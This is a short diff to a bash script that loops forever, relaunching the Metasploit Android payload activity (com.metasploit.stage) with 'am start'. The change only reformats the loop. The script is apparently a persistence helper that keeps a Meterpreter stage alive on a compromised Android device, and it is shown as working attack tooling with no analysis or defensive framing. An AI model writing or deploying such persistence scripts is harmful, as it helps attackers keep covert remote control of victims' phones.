@@ -1,5 +1,6 @@
 #!/bin/bash
 while :
-do am start --user -0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
-sleep 0.0
+do
+	am start --user -0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+	sleep 0.0
 done
